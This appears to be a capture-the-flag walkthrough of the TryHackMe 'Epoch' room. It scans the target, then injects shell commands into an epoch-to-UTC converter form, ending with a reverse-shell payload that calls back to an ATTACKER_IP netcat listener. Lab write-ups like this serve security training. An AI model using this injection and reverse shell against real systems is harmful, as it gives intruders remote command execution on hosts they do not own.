# Scenario

Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!

**Access this challenge** by deploying both the vulnerable machine by pressing the green "`Start Machine`" button located within this task, and the TryHackMe AttackBox by pressing the  "`Start AttackBox`" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: `http://MACHINE_IP`

# Enumeration

## \[+] 10.10.219.237 - epoch.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.219.237 epoch.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.219.237
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] epoch.thm

Here we have a web application that converts [UNIX Epoch time](https://en.wikipedia.org/wiki/Unix_time) to [UTC](https://en.wikipedia.org/wiki/Utc):

![638ac4903ae5ab97c804fa992ceabd77.png](/resources/7d630bf8eea24bcf8535da7dcf1e7f32.png)

From the Wikipedia article: *"Unix time is a date and time representation widely used in computing. It measures time by the number of non-leap seconds that have elapsed since 00:00:00 UTC on 1 January 1970, the Unix epoch."*

We can test that by entering the value `0` then clicking on the "Convert" button:

If we try entering a command like `whoami` we receive an error message:

Instead, we can try chaining commands using a pipe (`|`) character or the semi-colon (`;`) character before the command we want to run. Entering the command `;whoami` reveals the current user `challenge`:

# Initial Foothold

To get a reverse shell, we first start our [Netcat](https://linux.die.net/man/1/nc) listener:

```sh
nc -nvlp 4444
```

Then back on the web application we run the command:

`;sh -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1`

After pressing the convert button, the page should hang and we should receive a connection back on our listener:

If we check the environment variables using the [env](https://linux.die.net/man/1/env) command we should find the flag:
